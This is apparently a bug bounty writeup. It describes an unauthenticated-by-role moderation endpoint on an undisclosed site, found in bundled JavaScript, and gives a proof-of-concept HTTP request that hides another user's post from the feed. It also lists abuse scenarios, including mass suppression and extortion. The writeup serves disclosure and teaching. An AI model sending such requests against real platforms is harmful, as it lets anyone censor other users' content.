---
title: "i found moderation endpoint in JS files made me remove any post from the default feed.  "
date: 2026-06-22T00:00:00Z
draft: false
tags: ["broken access control", "BAC", "api", "writeup"]
categories: ["findings"]
cover:
  image: "" # optional: put an image in static/images and reference /images/foo.png
  alt: ""
  caption: ""
---

## recon

since i can't disclose the program let's call it `target.com`. the app had a lot
of functionality, and reading the js files was the move to understand those
functions and find hidden endpoints. while analyzing the bundles i hit a really
interesting block:

```js
// POST /api/posts/{id}/moderate — community "flag" (the BFLA endpoint), request schema only allows reason:"MATURE"
aq=s.z.object({description:s.z.string().optional(),reason:s.z.literal("MATURE")}),
aK=s.z.object({adult:s.z.boolean().optional(),message:s.z.string(),postId:s.z.string()}),
aV=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderate`,aq,aK,r);return a},

// shared enums
aG={NC17:"NC17",PG:"PG",R:"R"},
aH={BLOCKED:"BLOCKED",COMPLETE:"COMPLETE",DELETED:"DELETED",REVIEW:"REVIEW"},

// POST /api/posts/{id}/moderation — staff status/category path (correctly 403 for FREE)
aY=s.z.object({category:s.z.enum(aG).optional().catch(void
0),reason:s.z.string().trim().min(1).max(500).optional(),status:s.z.enum(aH).optional().catch(void 0)}).refine(e=>void 0!==e.status||void
0!==e.category,{message:"At least one of status or category must be provided."}),
aX=async(e,t,r)=>{let{data:a}=await e.post(`/api/posts/${t}/moderation`,aY,aY,r);return a},

// GET /api/posts/{id}/moderation — moderation decision log
io=s.z.object({createdAt:s.z.string(),decision:s.z.string(),fromCat:s.z.enum(aG).nullable().catch(null),fromStatus:s.z.enum(aH).catch("REVIEW"
),id:s.z.string(),reason:s.z.string().nullable(),reviewerId:s.z.string().nullable(),toCat:s.z.enum(aG).nullable().catch(null),toStatus:s.z.enu
m(aH).catch("REVIEW")}),
is=s.z.object({data:s.z.array(io)}),
il=async(e,t)=>{let{data:r}=await e.get(`/api/posts/${t}/moderation`,is);return r}
```

## the two endpoints (this is the whole bug)

look closely — there are two near-identical moderation routes, one character apart:

- `POST /api/posts/{id}/moderation` — the **staff** path (status/category). this
  one is locked down correctly: a free account gets **403**.
- `POST /api/posts/{id}/moderate` — the **community "flag"** path. same prefix,
  no trailing `-tion`. this one has **no authorization check at all**.

the protection was applied to one of two sibling endpoints and forgotten on the
other. that's it. that's the finding.

## exploitation

i gave the block to claude code to help me shape the request fast, grabbed a
coffee, and came back to a working call in ~10 minutes. the schema told me all i
needed: `reason:"MATURE"` is the only required field.

so from a **low-priv attacker account (A)**, against a **victim's post (B)**
that A doesn't own:

```http
POST /api/posts/cmpxelehi005e01s6d9jp4vc0/moderate HTTP/2
Host: target.com
Authorization: Bearer <attacker account A>
Content-Type: application/json

{"reason":"MATURE"}
```

response — the mutation happening server-side:

```http
HTTP/2 200
{"message":"Post flagged successfully.","postId":"cmpxelehi005e01s6d9jp4vc0","adult":true}
```

note the `"adult":true` in the response. that flag is what hides the post from
the default feed.

**before:** the post is visible in the default feed.
**after:** one request later, it's gone. _(screenshots: feed before / feed after)_

what makes this a vuln and not a normal "report this post" feature:

- a **single** flag from **one ordinary account** instantly sets `adult:true` —
  no threshold, no quorum, no human review queue.
- it works on **posts you don't own** (cross-account → the BOLA half).
- **no rate limit**, so you can sweep a whole creator's feed, not just one post.
- the victim can't trivially undo it themselves.

## impact

any authenticated user can unilaterally take down arbitrary content. concretely:
silence a competitor's announcement, suppress a creator/journalist, mass-hide a
target's entire feed, or extort ("pay or your posts stay hidden"). it's a
content-integrity / censorship primitive available to every logged-in user.

**class:** broken function-level authorization (BFLA) — a privileged moderation
action exposed with no role check, and no object-level ownership scoping.
